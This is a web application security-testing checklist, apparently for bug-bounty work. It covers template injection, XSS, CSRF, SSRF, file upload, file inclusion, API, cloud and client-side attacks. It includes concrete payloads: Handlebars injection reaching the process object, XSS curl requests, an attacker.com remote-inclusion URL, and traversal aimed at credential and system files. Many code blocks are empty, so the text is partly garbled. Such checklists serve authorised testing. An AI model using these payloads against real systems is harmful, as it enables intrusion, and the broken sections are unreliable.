```bash
```

- [ ] ${product.class}
- [ ] # Testing Locations:
```bash
```


### 🔍 Web application forms
```bash
```


### 🔍 API parameter processing
```bash
```


### 🔍 Dynamic content generation
```bash
```


### 🔍 Report generation interfaces
```bash
```


### 🔍 Configuration panels

### 🔍 Handlebars.js Templates
```bash
# Detection Payloads..
```

```bash
```

- [ ] {{constructor}}
```bash
```

- [ ] {{constructor.constructor('return process')()}}
```bash
```

- [ ] {{#with "constructor"}}{{constructor("return process")()}}{{/with}}
- [ ] # Testing Locations:
```bash
```


### 🔍 Form template rendering
```bash
```


### 🔍 Dynamic HTML generation
```bash
```


### 🔍 User-submitted content processing
```bash
```


### 🔍 Template compilation endpoints
```bash
```


### 🔍 Client-side template rendering

### 🔍 Automate to Test SSTi
```bash
# Run all template injection tests
```

- [ ] nuclei -u https://target.com -t /nuclei-template/dast/vulnerabilities/ssti/
- [ ] # Specific template engines
```bash
```

- [ ] nuclei -u https://target.com -t /nuclei-templates/dast/vulnerabilities/ssti/ssti-jinja2.yaml
```bash
```

- [ ] nuclei -u https://target.com -t /nuclei-templates/dast/vulnerabilities/ssti/ssti-twig.yaml
```bash
```

- [ ] nuclei -u https://target.com -t /nuclei-templates/dast/vulnerabilities/ssti/ssti-freemarker.yaml
- [ ] # Custom wordlist with SSTI payloads
```bash
```

- [ ] nuclei -u https://target.com -w ssti-payloads.txt -t /nuclei-templates/dast/vulnerabilities/ssti/
- [ ] # Verbose output with all SSTI templates
```bash
```

- [ ] nuclei -u https://target.com -t /nuclei-templates/dast/vulnerabilities/ssti/ -v -debug

### 🔍 Cross-Site Scripting (XSS)
- [ ] XSS allows attackers to execute JavaScript in other users' browsers

### 🔍 Reflected XSS Testing
- [ ] Testing for reflected cross-site scripting vulnerabilities.
- [ ] Inject payloads in any GET params (e.g., Search boxes, ?q= parameters, filters)
- [ ] Inject in POST body (Login/signup, feedback forms, JSON APIs)

### 🔍 Test URL path segments (/search/<value>)
- [ ] Check hash(#) fragment identifiers in single-page apps
- [ ] Inject in headers (User-Agent, Referer, X-Forwarded-For)
- [ ] Modify cookies to see if values reflect on page (Like Personalized greetings, user settings, tracking cookies)
- [ ] HTML context: <script>, <img>, <svg> in reflected areas (Raw HTML blocks, comments, forum posts)
- [ ] Attribute context: "><svg onload=alert(1)> in attributes like title/alt
- [ ] JavaScript context: break quotes in inline <script> or event handlers
- [ ] CSS context: inject style rules / JS in style attr or <style>
- [ ] URL context: test href/src/action in links, forms, images
- [ ] Bypass filters via URL-encode, HTML entities, double encoding in inputs
- [ ] Use Unicode tricks (homoglyphs, normalization) in form/query fields
- [ ] Base64 encode payloads if app decodes values (JWT, debug params)
- [ ] Try UTF-7/16/32 encoding if charset misconfigured (legacy pages)
- [ ] Use multi-byte/null/control chars to bypass filters
- [ ] JS obfuscation (concat, fromCharCode, template literals) in restricted inputs

### 🔍 Basic XSS Testing
```bash
curl "https://target.com/search?q=<script>alert(1)</script>"
```


### 🔍 XSS Filter Bypass
```bash
curl "https://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>"
```


### 🔍 Stored XSS Testing
- [ ] Testing for stored cross-site scripting in high-impact locations.

### 🔍 Advanced XSS Techniques
- [ ] Use mutation XSS, React/Angular/Vue-specific injections, template/compiler bypasses, and advanced sanitization evasion techniques

### 🔍 Cross-Site Request Forgery
- [ ] Modern applications rely heavily on APIs - they're often less protected

### 🔍 CSRF Techniques
- [ ] Test API endpoints for CSRF by checking token handling, headers, and modern vectors like JSON, file upload, WebSocket, and GraphQL
- [ ] Missing CSRF token – test POST/PUT/DELETE endpoints without token
- [ ] Token reuse – resend old CSRF token in requests to check acceptance
- [ ] Weak/predictable tokens – brute-force or guess token values in forms
- [ ] Token fixation – set token in session before login and reuse
- [ ] Double-submit cookie bypass – send token in both cookie and param
- [ ] Same-origin policy bypass – attempt requests from different origins
- [ ] Referrer header manipulation – test if server trusts Referer alone
- [ ] Custom header requirement bypass – use curl/postman without header
- [ ] Content-type bypass – send JSON/form data with unsupported Content-Type
- [ ] SameSite=Lax bypass – exploit cross-site navigation with GET/POST
- [ ] SameSite=Strict circumvention – test subdomains or redirects
- [ ] JSON CSRF – test endpoints accepting application/json via cross-site request
- [ ] File upload CSRF – submit files via forged cross-site requests
- [ ] WebSocket CSRF – attempt unauthorized WS messages from another origin
- [ ] GraphQL CSRF – forge mutation/query requests to test protection

### 🔍 Advanced CSRF Techniques
- [ ] Exploit advanced CSRF in login, social auth, password reset, registration, financial, profile, admin, and multi-step workflows.
- [ ] Login CSRF – try logging a victim into your account via a cross-site request (test login forms, SSO endpoints)
- [ ] Social login CSRF – trick user to login via OAuth/social auth without their consent
- [ ] Password reset CSRF – submit reset requests from another site to change victim password
- [ ] Registration CSRF – force registration of new accounts via cross-site requests
- [ ] Financial transaction CSRF – try transferring money, sending credits, or paying bills via forged requests
- [ ] Profile modification CSRF – change victim profile details (email, name, address) from another site
- [ ] Admin function CSRF – test admin panel actions via CSRF (if you have permission in bug bounty scope)
- [ ] Multi-step CSRF – attack processes that require multiple requests (like checkout or workflow steps)

### 🔍 Server-Side Request Forgery
- [ ] Modern applications rely heavily on APIs - they're often less protected

### 🔍 SSRF Techniques
- [ ] Test SSRF on internal/external endpoints, different protocols, and try internal service access.
- [ ] Access internal APIs via SSRF – test URL fetchers that accept HTTP/HTTPS
- [ ] Attempt SSRF to internal/admin dashboards – check sensitive URLs
- [ ] Authentication bypass via SSRF – see if internal services can be accessed without login
- [ ] Inject parameters via SSRF – test query strings or POST data to internal endpoints
- [ ] file:// protocol SSRF – try reading local files if file fetcher is vulnerable
- [ ] ftp:// protocol SSRF – check if FTP servers can be reached through SSRF
- [ ] gopher:// SSRF – send raw requests to internal services (e.g., Redis, Memcached)
- [ ] dict:// protocol SSRF – test uncommon protocols supported by the server
- [ ] ldap:// protocol SSRF – query internal LDAP endpoints if reachable
- [ ] jar:// protocol SSRF – check if Java JAR file endpoints can be accessed
- [ ] SSRF TCP port scan – try connecting to internal IPs to see open ports (HTTP/HTTPS, SSH, RDP)
- [ ] SSRF UDP service discovery – test internal UDP services like DNS, NTP (if allowed)
- [ ] SSRF banner grabbing – fetch service banners to identify software versions
- [ ] SSRF service fingerprinting – identify type/version of internal services
- [ ] SSRF network mapping – understand reachable internal IP ranges
- [ ] SSRF to cloud metadata – AWS/Azure/GCP internal metadata service access
- [ ] SSRF to internal DB endpoints – check if internal DB is accessible via HTTP/DB protocols
- [ ] SSRF to internal web apps – try accessing intranet/admin interfaces
- [ ] SSRF to configuration services – fetch internal config files or endpoints if reachable

### 🔍 Advanced SSRF Techniques
- [ ] Bypass filters using URL obfuscation, IP encoding, DNS rebinding, redirects, and shorteners.
- [ ] Use Unicode domain names to bypass filters – test URL fetchers that block known internal hosts
- [ ] Obfuscate IP addresses (e.g., 127.0.0.1 → 0177.0.0.1) to bypass IP filters
- [ ] Test DNS rebinding to reach internal services through public domains
- [ ] Use URL shorteners to bypass whitelist/blacklist checks
- [ ] Chain multiple redirects to reach blocked internal endpoints
- [ ] Send decimal-encoded IPs instead of dotted notation to bypass filters
- [ ] Use hexadecimal IPs (0x7f000001 for 127.0.0.1) in SSRF payloads
- [ ] Test octal IP representations to bypass IP restrictions
- [ ] Use IPv6 internal addresses or IPv4-mapped IPv6 (::ffff:127.0.0.1)
- [ ] Try CIDR notation to bypass filtering logic (e.g., 127.0.0.1/32)

### 🔍 Blind SSRF Techniques
- [ ] Detect SSRF without direct output via time delays, DNS/HTTP callbacks, or error message analysis.
- [ ] Use slow/internal requests (sleep/delay) to detect SSRF without visible output – test URL fetchers
- [ ] Trigger requests to your own domain (nslookup/ping) to detect SSRF – test endpoints fetching remote URLs
- [ ] Send requests to your controlled HTTP server to observe SSRF requests – test image, XML, or JSON fetchers
- [ ] Look for error messages revealing internal network behavior – test any endpoint that fetches URLs and returns errors

### 🔍 FILE UPLOAD VULNERABILITIES
- [ ] Modern applications rely heavily on APIs - they're often less protected

### 🔍 File Upload Techniques
- [ ] Test upload endpoints, bypass validations, inspect storage, and check for chained vulnerabilities.
- [ ] Discover all upload points (forms, drag-drop, APIs, mobile) and note limits for size, type, and auth
- [ ] Probe extension & name filters — try renamed files, double extensions, case changes, trailing dots/spaces, and special chars/RTL overrides
- [ ] Alter headers (Content-Type, Content-Disposition) or multipart boundaries to bypass MIME checks
- [ ] Upload tricky payloads: GIF/HTML or PDF/JS polyglots, SVG or fonts with scripts, and watch how preview engines react
- [ ] After upload, see how files are stored, renamed, or rendered (download vs raw render). Inspect thumbnails, metadata, and processing pipelines
- [ ] Look for logic flaws: IDOR or overwrite other users’ files; try huge uploads or floods to test DoS limits
- [ ] Check storage back-ends (S3/GCS/Azure) for open buckets, weak signed URLs, or public object listings
- [ ] Experiment with converters and parsers (ImageMagick, ExifTool, template engines). Use safe “zip bomb” or magic-byte tricks to see how the stack validates content
- [ ] Combine upload issues with other flaws — e.g., SVG → stored XSS, or uploaded template leading to RCE

### 🔍 Files To Test File-Upload Vulnerabilities
- [ ] Use crafted files to detect XSS, RCE, template issues, and storage logic flaws.
- [ ] PNG with malicious EXIF/metadata (test for stored XSS in viewers)
- [ ] PNG file where filename has <script> tags → test if reflected anywhere
- [ ] JPEG with malicious EXIF/metadata (test for stored XSS in viewers)
- [ ] SVG with harmless <script/onload> → check if rendered unsanitized

### 🔍 GIF with appended HTML/JS (GIF+HTML polyglot)
- [ ] PDF containing embedded JavaScript → see if viewer executes code
- [ ] PDF with malicious EXIF/metadata (test for stored XSS in viewers)
- [ ] Word/Excel doc with benign macro → check doc converters / previewers
- [ ] Upload harmless template file (.twig, .ejs) to test template parsing
- [ ] Tiny “zip bomb” → verify decompression and quota limits (safe size)
- [ ] ZIP with image + HTML polyglot to test file sniffing after extraction
- [ ] PNG renamed as .php (or PHP with PNG magic bytes) → test MIME sniffing
- [ ] JPEG with Content-Type: text/html header → check response handling
- [ ] File with weird Content-Disposition headers → see if forced inline
- [ ] TTF/OTF font containing harmless script → test font renderers
- [ ] Photoshop (PSD) file → see if preview engines handle safely

### 🔍 HEIC image with crafted metadata (iOS images)
- [ ] Upload via signed URL → verify expiry and access controls
- [ ] Upload file with same name as another user → see if overwrite/IDOR

### 🔍 File Inclusion
- [ ] Modern applications rely heavily on APIs - they're often less protected

### 🔍 Local File Inclusion
- [ ] Test for LFI by enumerating file-including parameters, attempting traversal, encoding bypasses, log poisoning, and source code exposure.
- [ ] Identify parameters/endpoints that include files (e.g., ?page=home.php, ?file=template.html) and note allowed extensions or directories
- [ ] Include local files like /etc/passwd, /proc/self/environ, log files, config files and check if content is reflected or causes errors
- [ ] Use traversal payloads: ../, ../../, %2e%2e%2f to reach restricted directories
- [ ] Attempt null byte injection (PHP < 8.0) to bypass extension filters: shell.php%00
- [ ] Poison server logs or temp files with user-controlled content and include them to achieve code execution
- [ ] Use URL encoding, double URL encoding, or UTF-8/UTF-16 encoding to bypass filters
- [ ] Attempt to bypass extension whitelists: .php5, .phtml, .txt or use wrappers (php://filter) to read source code
- [ ] Use PHP wrappers like php://filter/read=convert.base64-encode/resource=target to read source code
- [ ] Common LFI test points: ?page=, ?file=, ?template=, ?view=, download endpoints, admin panels, AJAX endpoints
- [ ] Check server response: errors, file content, blank page, redirects, inclusion of attacker-controlled content

### 🔍 Remote File Inclusion
- [ ] Test for RFI by including external URLs, testing alternate protocols/wrappers, upload-chaining, and bypassing filters to achieve remote code execution.
- [ ] Identify parameters/endpoints that accept external file URLs and note allowed protocols (http, https, ftp, etc.)
- [ ] Include remote files like http://attacker.com/shell.txt or https://raw.githubusercontent.com/... to see if content is loaded
- [ ] Test alternate protocols: file://, ftp://, php://input, data://, expect:// if supported by server
- [ ] If file upload exists, upload a harmless script and include it via RFI to achieve remote code execution
- [ ] Use URL encoding, double encoding, or UTF-8/UTF-16 encoding to bypass RFI filters
- [ ] Attempt to bypass allowed extensions or content-type restrictions for remote files
- [ ] Common RFI test points: ?page=, ?file=, ?include=, template/view parameters, download endpoints
- [ ] Check server response: included content execution, errors, blank pages, remote code execution attempts

### 🔍 API Security Testing
- [ ] Modern applications rely heavily on APIs - they're often less protected

### 🔍 Rest API Testing
- [ ] Test REST APIs for authentication, authorization, parameter handling, and endpoint security.
- [ ] Recon - Identify all API endpoints, request methods, headers, authentication mechanisms, and parameter types; capture requests/responses
- [ ] API Key Security - Check for key exposure, secure transmission, rotation, enumeration, and privilege escalation
- [ ] JWT Token Testing - Test algorithm confusion, key confusion, token manipulation, claim injection, and signature bypass
- [ ] HTTP Method Manipulation - Test OPTIONS, HEAD, PUT, DELETE, PATCH, and custom methods for misuse or information leakage
- [ ] Parameter Pollution & Injection - Test HPP, array parameters, JSON/XML injection, and form-data manipulation
- [ ] Reporting - Document vulnerabilities, automate repetitive API tests, and map risks per endpoint and parameter

### 🔍 GraphQL API Testing
- [ ] Test GraphQL APIs for schema exposure, injection, query complexity, and access control weaknesses.
- [ ] Recon - Discover GraphQL endpoints, capture queries/mutations/subscriptions, and identify authentication mechanisms
- [ ] Schema Introspection - Execute introspection queries, enumerate types, fields, arguments, and directives
- [ ] Query Complexity Attacks - Test nested queries, circular references, resource exhaustion, batch overload, and alias amplification
- [ ] GraphQL Injection - Test query, mutation, subscription, variable injection, and fragment manipulation for vulnerabilities
- [ ] Reporting - Document findings, automate repetitive tests, and map risks per query/mutation/field

### 🔍 API Rate-Limiting & DDOS
- [ ] Assess API rate-limiting, endpoint protections, gateway abuse, DoS potential, and version exposure.
- [ ] Recon - Identify API endpoints, versions, and accessible documentation; capture request patterns and authentication mechanisms
- [ ] Rate Limit Bypass - Test request flooding, delays, IP/User-Agent rotation, and bypass techniques
- [ ] API Gateway Abuse - Test request throttling, burst limits, and abuse of gateway protections
- [ ] Endpoint Enumeration - Discover hidden or undocumented endpoints and test access without limits
- [ ] Version Discovery - Identify old or deprecated API versions and test their protections
- [ ] Documentation Exposure - Check if API docs expose sensitive info or allow unintended access
- [ ] Reporting - Document rate limiting weaknesses, DoS potential, and automated tests per endpoint

### 🔍 WebSocket Security Testing
- [ ] Test WebSocket endpoints for connection security, message integrity, hijacking, and protocol attacks.
- [ ] Recon - Identify WebSocket endpoints, protocols, headers, and authentication mechanisms; capture messages
- [ ] Connection Security - Test WebSocket hijacking, CSWSH, Origin header bypass, protocol downgrade, message injection, and connection state manipulation
- [ ] Message Security - Test message tampering, binary injection, protocol confusion, frame manipulation, and compression bomb attacks
- [ ] Reporting - Document WebSocket vulnerabilities, automate tests, and map risks per endpoint and message type

### 🔍 Information Disclosure
- [ ] Modern applications rely heavily on APIs - they're often less protected

### 🔍 Sensitive Files Discovery
- [ ] Test for exposed backups, configs, and source code that may leak sensitive information.
- [ ] Recon - Identify accessible file paths, directories, and endpoints; capture requests for analysis
- [ ] Backup File Discovery - Test .bak, .old, .backup extensions, compressed backups, and version control backup files
- [ ] Configuration File Access - Test for .env, web.config, .htaccess, database configs, and API key exposure
- [ ] Source Code Disclosure - Test .git, .svn, IDE project files, template sources, and debug information exposure
- [ ] Reporting - Document discovered backup/config/source files, sensitive info exposure, and automate repeatable checks

### 🔍 Cache-Based Information Disclosure
- [ ] Assess cache mechanisms for sensitive data exposure via browser, server, CDN, and client-side caches.
- [ ] Identify endpoints, resources, and responses that are cached by browser, server, CDN, or application
- [ ] Test sensitive data exposure via browser cache: HTML pages, JS, CSS, cookies, auth tokens
- [ ] Manipulate server-side caching: test stale content, access restricted resources via cache, check Vary headers
- [ ] Test CDN caching: stale content delivery, bypass cache controls, force cache poisoning via query params or headers
- [ ] Test client-side app caches (Service Workers, localStorage, IndexedDB) for sensitive data exposure and bypass techniques
- [ ] Document cache-related vulnerabilities, sensitive data exposure, and automate repeatable checks if possible

### 🔍 Metadata & Comments Analysis
- [ ] Analyze file metadata, code comments, and headers for hidden information disclosure.
- [ ] Identify pages, scripts, styles, and files that may contain comments, metadata, or headers with sensitive info
- [ ] Inspect HTML source for comments that reveal sensitive information or implementation details
- [ ] Check JavaScript files for comments, debug info, or API keys exposed in code
- [ ] Inspect CSS files for comments that may disclose design, classes, or hidden features
- [ ] Analyze HTTP headers (Server, X-Powered-By, Set-Cookie) for sensitive info or misconfigurations
- [ ] Extract metadata from files (PDF, DOCX, images) to find usernames, software versions, timestamps, or paths
- [ ] Document findings from comments and metadata, and automate repeatable analysis where possible

### 🔍 Error Analysis
- [ ] Test application and server error handling for detailed messages, stack traces, and sensitive data leaks.
- [ ] Identify endpoints, parameters, and actions that may trigger errors; capture request/response for analysis
- [ ] Check for detailed application error messages: stack traces, debug info, exception messages, DB errors
- [ ] Inspect server, framework, and middleware responses for sensitive information [Server IP] or implementation details
- [ ] Check error messages, headers, or responses for software versions, library info, or patch levels

### 🔍 BUSINESS LOGIC VULNERABILITIES
- [ ] Testing the underlying infrastructure and cloud services

### 🔍 Financial Logic Flaws - Price Manipulation
- [ ] Test financial logic flaws to manipulate pricing, discounts, and refunds.
- [ ] Negative Quantity Attacks - Test ordering negative quantities to manipulate price
- [ ] Currency Conversion Abuse - Exploit conversion rates to gain price advantage
- [ ] Tax Calculation Bypass - Manipulate tax calculations or exemptions
- [ ] Discount Code Manipulation - Abuse promo/discount codes for unintended reductions
- [ ] Refund Process Abuse - Exploit refund flows to gain extra money/items

### 🔍 Financial Logic Flaws - Payment Flow Attacks
- [ ] Assess payment flow vulnerabilities like race conditions, double spending, and verification bypass.
- [ ] Race Condition in Payments - Attempt simultaneous requests to exploit timing issues
- [ ] Double Spending Attempts - Test multiple transactions using same payment
- [ ] Payment Verification Bypass - Skip or manipulate payment checks
- [ ] Transaction Replay Attacks - Reuse previous transactions to trigger actions
- [ ] Gateway Response Manipulation - Modify or spoof gateway responses

### 🔍 Usermanagement Logic - Registration Process Abuse
- [ ] Check registration process flaws to bypass email verification, roles, or account restrictions.
- [ ] Email Verification Bypass - Register accounts without confirming email
- [ ] Duplicate Account Creation - Create multiple accounts bypassing restrictions
- [ ] Role Assignment Manipulation - Change roles during or after registration
- [ ] Invitation Code Abuse - Exploit invite-based signup flows
- [ ] Account Recovery Bypass - Exploit forgot-password or recovery flows

### 🔍 Usermanagement Logic - Profile Management Flaws
- [ ] Test profile management logic to exploit XSS, privacy bypass, and account linking issues.
- [ ] Profile Picture URL Injection - Inject malicious URLs in profile images
- [ ] Bio Field Script Injection - Test XSS or JS injection in bio/description fields
- [ ] Contact Information Abuse - Manipulate or expose contact data
- [ ] Privacy Setting Bypass - Access hidden or restricted profile info
- [ ] Account Linking Attacks - Abuse linking mechanisms to merge or hijack accounts

### 🔍 Race Condition Exploitation
- [ ] Identify race conditions in transactions, resource handling, and database operations.
- [ ] Parallel Transaction Processing - Send concurrent requests to test race conditions
- [ ] Resource Allocation Races - Exploit conflicts in resource allocation
- [ ] State Manipulation Attacks - Change state during concurrent processing
- [ ] Lock Bypass Techniques - Attempt to bypass locking mechanisms
- [ ] Queue Manipulation - Exploit queue processing order for advantage
- [ ] Transaction Isolation Bypass - Exploit weak isolation levels in DB
- [ ] Concurrent Update Conflicts - Test simultaneous updates for data integrity issues
- [ ] Deadlock Exploitation - Force deadlocks to bypass restrictions or cause errors
- [ ] Constraint Violation Abuse - Exploit DB constraints during concurrent operations

### 🔍 Rate Limiting & DoS Testing
- [ ] Test rate limiting and DoS vulnerabilities using IP, session, and header manipulation.
- [ ] X-Forwarded-For Manipulation - Spoof client IP to bypass rate limits
- [ ] X-Real-IP Header Abuse - Alter header to evade IP-based limits
- [ ] Proxy Chain Exploitation - Use multiple proxies to bypass restrictions
- [ ] IPv6 Address Rotation - Rotate IPv6 addresses to bypass rate limiting
- [ ] Session Token Rotation - Rotate tokens to bypass session-based limits
- [ ] User Agent Manipulation - Change user agent to bypass session limits
- [ ] Cookie Modification - Alter cookies to evade rate restrictions
- [ ] Request Header Variation - Change headers to bypass application limits
- [ ] Distributed Request Patterns - Use multiple sources to bypass limits
- [ ] ReDoS (Regular Expression DoS) - Exploit regex complexity to delay processing
- [ ] Hash Collision Attacks - Send colliding inputs to degrade performance

### 🔍 Data Validation Logic Flaws
- [ ] Assess data validation logic flaws like type confusion, boundary checks, and workflow bypasses.
- [ ] Input Length Manipulation - Test unusually short, long, or empty values to bypass validation
- [ ] Data Type Confusion - Submit unexpected data types (string vs number, boolean, JSON) to bypass checks
- [ ] Boundary Value Testing - Use min/max, negative, zero, or extreme values to test validation
- [ ] State Machine Bypass - Submit requests out-of-order or skip steps to bypass workflow restrictions
- [ ] Workflow Step Skipping - Attempt to reach later steps without completing required prior steps

### 🔍 PROTOTYPE POLLUTION
- [ ] Testing the underlying infrastructure and cloud services

### 🔍 Client-Side Prototype Pollution
- [ ] Identify and exploit client-side prototype pollution to manipulate objects and app behavior.
- [ ] Recon - Identify endpoints, parameters, or inputs (JSON, query params, POST data) that can be used to manipulate object properties
- [ ] Object.prototype Manipulation - Test constructor pollution, __proto__ changes, prototype chain traversal, and global object pollution
- [ ] Library-Specific Attacks - Test jQuery, Lodash, Underscore.js, and other libraries for merge, extend, or assign pollution vulnerabilities
- [ ] Business Logic Impact - Check if prototype pollution can alter app behavior, bypass client-side validation, or escalate privileges

### 🔍 Server-Side Prototype Pollution
- [ ] Assess server-side prototype pollution risks to detect RCE, auth bypass, and privilege escalation.
- [ ] Recon - Identify endpoints, JSON parameters, or POST bodies that can influence object properties on the server side
- [ ] Node.js Environment Attacks - Test Process.env manipulation, module prototype pollution, Express.js handling, and database query pollution
- [ ] Exploitation Techniques - Attempt RCE, authentication bypass, privilege escalation, configuration manipulation, and security control bypass via polluted objects
- [ ] Business Logic Impact - Check if pollution can alter server behavior, bypass authorization, or escalate privileges in the application

### 🔍 Infrastructure & Cloud Security
- [ ] Testing the underlying infrastructure and cloud services

### 🔍 Subdomain Takeover
- [ ] Identify dangling DNS records and test unclaimed cloud services for subdomain takeover risks.
- [ ] Check DNS for dangling CNAMEs pointing to unclaimed cloud services

### 🔍 Attempt Heroku subdomain takeover

### 🔍 Test GitHub Pages subdomain takeover

### 🔍 Check unclaimed or misconfigured AWS S3 buckets

### 🔍 Test Azure subdomain takeover

### 🔍 Test Netlify subdomain takeover

### 🔍 Cloud Storage Misconfigurations
- [ ] Check AWS, GCP, and Azure storage buckets for misconfigured permissions or public exposure.

### 🔍 Check AWS S3 buckets for public read access

### 🔍 Check AWS S3 buckets for public write access

### 🔍 Check Google Cloud Storage bucket permissions

### 🔍 Check Azure Storage account/container permissions

### 🔍 Apache Security Testing
- [ ] Review Apache modules, configs, and permissions for security weaknesses or misconfigurations.
- [ ] mod_rewrite Exploitation - Check rewrite rules for bypass or injection
- [ ] mod_cgi Vulnerabilities - Test CGI scripts for remote code execution
- [ ] mod_php Configuration Issues - Look for insecure PHP settings
- [ ] mod_ssl Weakness Testing - Check SSL/TLS config and weak ciphers
- [ ] .htaccess Exposure - Verify sensitive rules or misconfigurations
- [ ] httpd.conf Misconfiguration - Review Apache config for insecure settings
- [ ] Virtual Host Security - Check host isolation and misconfigurations
- [ ] Directory Permissions - Test for world-readable or writable directories

### 🔍 Nginx Security Testing
- [ ] Analyze Nginx configuration, modules, and routing rules for security flaws or bypass paths.
- [ ] Location Block Bypass - Test Nginx location rules for path bypass
- [ ] Alias Misconfiguration - Verify alias paths for unauthorized access
- [ ] Root Directive Issues - Check document root and path exposure
- [ ] try_files Exploitation - Test Nginx try_files config for bypass
- [ ] FastCGI Configuration - Check for RCE or parameter injection
- [ ] Proxy Module Abuse - Test proxy_pass and header handling
- [ ] Load Balancer Manipulation - Check upstream server configs
- [ ] Rate Limiting Bypass - Test Nginx limit_req and limit_conn

### 🔍 IIS Security Testing
- [ ] Assess IIS configurations, authentication, and handler settings for exposure or privilege abuse.
- [ ] Web.config Exploitation - Test for misconfigurations or sensitive info exposure
- [ ] Application Pool Abuse - Check for insecure app pool settings
- [ ] Handler Mapping Issues - Test custom handlers for code execution
- [ ] Authentication Provider Bypass - Test Windows/IIS auth mechanisms

### 🔍 Reverse Proxy Security Testing
- [ ] Evaluate reverse proxies for request smuggling, cache issues, and other parsing weaknesses.
- [ ] HTTP/1.1 Desync Attacks - Test request smuggling vulnerabilities
- [ ] Content-Length Manipulation - Check for request parsing issues
- [ ] Transfer-Encoding Abuse - Exploit encoding inconsistencies
- [ ] Chunk Size Manipulation - Test chunked requests for smuggling
- [ ] Request Splitting Attacks - Test header splitting or injection
- [ ] Web Cache Deception - Exploit cache to expose sensitive content
- [ ] HTTP Cache Poisoning - Manipulate cache to serve malicious content
- [ ] CDN Cache Manipulation - Test CDN caching for stale or unauthorized content
- [ ] Vary Header Abuse - Exploit inconsistent cache behavior
- [ ] Cache Key Confusion - Test cache key misconfigurations

### 🔍 Load Balancer Security Testing
- [ ] Test load balancers for access bypass, session persistence flaws, and health check leaks.
- [ ] Load Balancer Bypass - Test access control and request routing
- [ ] Session Persistence Issues - Test sticky session handling
- [ ] Health Check Manipulation - Exploit LB health endpoints
- [ ] Sticky Session Attacks - Abuse session affinity for unauthorized access

### 🔍 CDN Security Testing
- [ ] Check CDNs for origin leaks, cache weaknesses, edge node attacks, or geo-restriction bypass.
- [ ] Origin Server Exposure - Find origin leaks bypassing CDN
- [ ] Cache Behavior Manipulation - Test CDN stale or sensitive content

### 🔍 Edge Server Exploitation - Attack CDN edge nodes
- [ ] Geo-blocking Bypass - Test geographic restrictions

### 🔍 Cryptographic Failures
- [ ] Testing cryptographic implementations, key management, and transport security

### 🔍 Cryptography Testing
- [ ] Review encryption, hashing, key management, and randomness to detect cryptographic weaknesses.
- [ ] Weak/Deprecated Algorithms - Detect MD5, SHA1, DES, RC4, or any custom weak ciphers used for encryption, hashing, or signing
- [ ] Hardcoded Keys or Secrets - Check for secrets, API keys, or passwords embedded in code, configs, or client scripts
- [ ] Improper Encryption - Detect ECB mode, missing IVs, static salts, or reversible encryption for sensitive data
- [ ] Key Management Failures - Check weak key rotation, improper storage, or key exposure via logs/configs
- [ ] Predictable Randomness - Test if tokens, session IDs, or IVs are generated using insecure or predictable PRNGs

### 🔍 SSL/TLS Security Testing
- [ ] Assess SSL/TLS settings, cipher suites, certificates, and pinning for transport-layer security gaps.
- [ ] Protocol Version Testing - Detect SSLv2/SSLv3, TLS 1.0/1.1, and downgrade attacks
- [ ] Cipher Suite Testing - Detect weak, NULL, RC4, or export-grade ciphers
- [ ] Certificate Validation - Self-signed, expired, hostname mismatches, or chain issues
- [ ] Certificate Pinning / Transparency - Test CT logs, SCT validation, and pin bypass

### 🔍 CLIENT-SIDE VULNERABILITIES
- [ ] How to write reports that get accepted and maximize payouts

### 🔍 Browser Security Feature Bypass
- [ ] Evaluate browser protections like SOP, CORS, postMessage, and cookie flags for weaknesses.
- [ ] Test SOP bypass on pages with cross-origin requests
- [ ] Check * in Access-Control-Allow-Origin; exploit via JS fetch from attacker domain
- [ ] Check Access-Control-Allow-Credentials; exploit with logged-in user cookies

### 🔍 Test subdomain bypass; use iframe or JS fetch
- [ ] Test null origin; exploit via crafted requests from file:// or data://
- [ ] Test regex origin patterns; exploit with matching crafted origin
- [ ] Exploit improper origin checks; send malicious messages to page
- [ ] Test insecure listeners; inject JS via postMessage events
- [ ] Inject payloads via postMessage to manipulate DOM or data
- [ ] Attack embedded frames via postMessage; check parent-child communications
- [ ] Bypass SameSite CSRF protection; exploit via cross-site requests
- [ ] Check missing Secure flag; steal cookies over HTTP
- [ ] Test JS access to HttpOnly cookies; exploit via XSS

### 🔍 Access other paths via cookie path misconfig
- [ ] Steal cookies across subdomains via domain attribute misconfig

### 🔍 Content Security Policy (CSP) Testing
- [ ] Review CSP directives, nonces, and hashes to find gaps that allow script or resource injection.
- [ ] Bypass script-src; inject scripts via allowed sources
- [ ] Exploit object-src; inject malicious objects/plugins
- [ ] Manipulate base-uri; redirect script or form sources
- [ ] Bypass form-action; submit forms to attacker endpoints
- [ ] Evasion of frame-ancestors; load page in malicious iframe

### 🔍 Reuse nonces; inject scripts with same nonce
- [ ] Attempt hash collision; load malicious inline script

### 🔍 Inject dynamic scripts; bypass CSP via JS DOM
- [ ] Abuse inline event handlers; trigger script execution

### 🔍 Check unsafe-inline; exploit inline scripts

### 🔍 Check unsafe-eval; inject eval-based scripts
- [ ] Wildcard sources (*); load attacker scripts from any origin
- [ ] Missing directives; inject resources where policy absent
- [ ] Abuse reporting URI; exfiltrate data via CSP reports

### 🔍 Clickjacking and UI Redressing
- [ ] Identify framing or visual tricks that mislead users and bypass frame or UI protections.
- [ ] Transparent Overlay - Overlay target button to trick user clicks
- [ ] Z-Index Exploitation - Place malicious iframe above target
- [ ] Cursorjacking - Mislead cursor to interact with hidden elements

### 🔍 Drag & Drop Hijacking - Intercept draggable items
- [ ] Text Selection Manipulation - Trick copy/paste or input
- [ ] Double-Click Hijacking - Exploit double-click actions
- [ ] X-Frame-Options Bypass - Load page despite XFO restrictions
- [ ] Frame-Ancestors Bypass - Bypass CSP frame-ancestors rules
- [ ] Sandbox Attribute Abuse - Exploit improper sandbox usage

### 🔍 Cross-Frame Scripting - Execute JS across frames

### 🔍 WebRTC and Media Security
- [ ] Check WebRTC and media features for IP leaks, stream abuse, and misconfigured signaling servers.
- [ ] WebRTC IP Leakage - Test if local or public IPs are exposed via WebRTC
- [ ] Media Stream Hijacking - Attempt unauthorized access to camera/mic streams
- [ ] STUN/TURN Server Abuse - Check for misconfigured servers exposing internal network info
- [ ] Peer Connection Manipulation - Inject or intercept data via peer connections

### 🔍 CLOUD SECURITY TESTING
- [ ] How to write reports that get accepted and maximize payouts

### 🔍 AWS Security Testing
- [ ] Assess S3, Lambda, IAM, and metadata services for exposure, privilege issues, and misconfigurations.

### 🔍 Enumerate public S3 buckets

### 🔍 Check for ACL misconfigurations
- [ ] Review bucket policies for excessive permissions or bypass

